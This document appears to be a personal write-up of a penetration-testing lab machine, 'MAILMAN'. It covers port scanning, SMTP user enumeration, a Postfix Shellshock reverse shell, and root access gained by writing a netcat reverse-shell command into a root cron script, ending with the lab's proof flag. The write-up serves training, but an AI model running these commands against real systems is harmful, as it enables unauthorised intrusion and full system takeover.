###  Machine Information

```shell
IP ADDRESS: 10.11.1.231
HN: MAILMAN
OS:  Linux
EXPLOIT/PORT: postfix-shellshock-nc.py 
PRIVESC: /etc/crontab/cleanup.sh
USERS MENTIONED: no users
CREDENTIALS: no credentials

Lessons Learned:

- SMTP exploit & enumeration
- reverse shell with cat /etc/crontab

```

### 1. Nmap:  

#nmapfulltcp
```shell
┌──(root㉿kali)-[/home/kali/Documents/offsec_labs_pen200/10.11.1.234]
└─# nmap -sC -sV -p- -Pn 10.11.1.231
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-16 17:57 EDT
Nmap scan report for 10.11.1.231
Host is up (0.057s latency).
Not shown: 65491 closed tcp ports (reset), 39 filtered tcp ports (no-response)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)
# look into if cant find anything else
| ssh-hostkey: 
|   1024 b68d1ef380643f8a9652927a9fb1be67 (DSA)
|   2048 72c406a72f711b6a6b57fecfad3f9c16 (RSA)
|_  256 6bc66efbba06dc23f93e01a62a87481a (ECDSA)
25/tcp  open  smtp        Postfix smtpd
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost.localdomain
| Not valid before: 2013-05-05T06:42:26
|_Not valid after:  2023-05-03T06:42:26
|_smtp-commands: mail.local, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN
111/tcp open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|_  100000  3,4          111/udp6  rpcbind
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: SECURITY)
445/tcp open  netbios-ssn Samba smbd 4.2.10-Debian (workgroup: SECURITY)
Service Info: Hosts:  mail.local, MAILMAN; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h19m56s, deviation: 2h18m34s, median: -4s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   300: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: MAILMAN, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
| smb2-time: 
|   date: 2023-03-16T22:00:31
|_  start_date: N/A
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.2.10-Debian)
|   Computer name: mailman
|   NetBIOS computer name: MAILMAN\x00
|   Domain name: local
|   FQDN: mailman.local
|_  System time: 2023-03-16T18:00:31-04:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 203.90 seconds

```

#nmapudp
```shell
never came back
```

## 1.5 SMB
#crackmapexec #guest
```shell
┌──(root㉿kali)-[/home/kali/Documents/offsec_labs_pen200/10.11.1.234]
└─#    crackmapexec smb 10.11.1.231 -u 'guest' -p '' --sessions
SMB         10.11.1.231     445    MAILMAN          [*] Windows 6.1 (name:MAILMAN) (domain:local) (signing:False) (SMBv1:True)
SMB         10.11.1.231     445    MAILMAN          [+] local\guest: 
SMB         10.11.1.231     445    MAILMAN          [+] Enumerated sessions
```
#crackmapexec #anonymous 
```shell
┌──(root㉿kali)-[/home/kali/Documents/offsec_labs_pen200/10.11.1.234]
└─#    crackmapexec smb 10.11.1.231 -u '' -p '' --sessions 
SMB         10.11.1.231     445    MAILMAN          [*] Windows 6.1 (name:MAILMAN) (domain:local) (signing:False) (SMBv1:True)
SMB         10.11.1.231     445    MAILMAN          [+] local\: 
SMB         10.11.1.231     445    MAILMAN          [+] Enumerated sessions

```
### 2. Searchsploit:
#searchsploit

```shell
┌──(root㉿kali)-[/home/kali]
└─# searchsploit postfix              
----------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                     |  Path
----------------------------------------------------------------------------------- ---------------------------------
gld 1.4 - Postfix Greylisting Daemon Remote Format String                          | linux/remote/934.c
Postfix 1.1.x - Denial of Service (1)                                              | linux/dos/22981.c
Postfix 1.1.x - Denial of Service (2)                                              | linux/dos/22982.pl
Postfix 2.6-20080814 - 'symlink' Local Privilege Escalation                        | linux/local/6337.sh
Postfix < 2.4.9/2.5.5/2.6-20080902 - '.forward' Local Denial of Service            | multiple/dos/6472.c
Postfix SMTP 4.2.x < 4.2.48 - 'Shellshock' Remote Command Injection                | linux/remote/34896.py
Salim Gasmi GLD (Greylisting Daemon) - Postfix Buffer Overflow (Metasploit)        | linux/remote/16841.rb
Salim Gasmi GLD (Greylisting Daemon) 1.0 < 1.4 - Postfix Greylisting Buffer Overfl | linux/remote/10023.rb
Salim Gasmi GLD (Greylisting Daemon) 1.x - Postfix Greylisting Daemon Buffer Overf | linux/remote/25392.c
----------------------------------------------------------------------------------- ---------------------------------

```

### 3. SMTP : telnet user identification
#webfuzzing 
```shell
┌──(root㉿kali)-[/home/kali/Documents/offsec_labs_pen200/10.11.1.231]
└─# telnet 10.11.1.231 25   
Trying 10.11.1.231...
Connected to 10.11.1.231.

#verified that useradm is the user due to coming back with a 252 error
┌──(root㉿kali)-[/home/…/Documents/offsec_labs_pen200/10.11.1.231/exploit]
└─# netcat 10.11.1.231 25
220 mail.local ESMTP Postfix (Debian/GNU)
VRFY usradm
550 5.1.1 <usradm>: Recipient address rejected: User unknown in local recipient table
VRFY useradmin
550 5.1.1 <useradmin>: Recipient address rejected: User unknown in local recipient table
VRFY useradm
252 2.0.0 useradm
```

### 5. Reverse Shell : postfix-shellshock-nc.py

```shell

┌──(root㉿kali)-[/home/…/Documents/offsec_labs_pen200/10.11.1.231/exploit]
└─# python2 postfix-shellshock-nc.py 10.11.1.231 useradm@mail.local 192.168.119.157 1234
#######################################################
[*] Connecting to target...
[*] Payload Sent.
[*] Wait for incomming shell
[!] To spawn an interactive shell
[!] Use: python -c 'import pty; pty.spawn("/bin/bash")'
#######################################################
```

### 6. Foothold Enumeration

```SHELL
#script running as root.

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*/5 *	* * *	root	/home/useradm/scripts/cleanup.sh > /dev/null 2>&1
```

![[1. cat etc crontab.png]]
### 7. Privilege Escalation : /etc/crontab cleanup.sh mod
```shell
#echo'd revshell into the script being ran as root
useradm@mailman:~/scripts$ echo "netcat 192.168.119.157 3535 -e /bin/bash 0>&1" > cleanup.sh
<echo "netcat 192.168.119.157 3535 -e /bin/bash 0>&1" > cleanup.sh  

# checking to ensure it actually got put in.
useradm@mailman:~/scripts$ cat cleanup.sh
cat cleanup.sh
netcat 192.168.119.157 3535 -e /bin/bash 0>&1

#setup listener & waited 5 minutes. & got on as root.
┌──(root㉿kali)-[/home/kali]
└─# nc -lvnp 3535
listening on [any] 3535 ...
connect to [192.168.119.157] from (UNKNOWN) [10.11.1.231] 40187

whoami
root

```

![[2. Privilege escalation.png]]
### 8. Flag

```powershell
cd /root
ls
proof.txt
cat proof.txt
86db499f415bdca432a915d280f10f73
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default 
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 00:50:56:86:d1:ec brd ff:ff:ff:ff:ff:ff
    inet 10.11.1.231/16 brd 10.11.255.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:fe86:d1ec/64 scope link 
       valid_lft forever preferred_lft forever
```

![[3. proof.txt & ip a.png]]



# Post Flag Notes








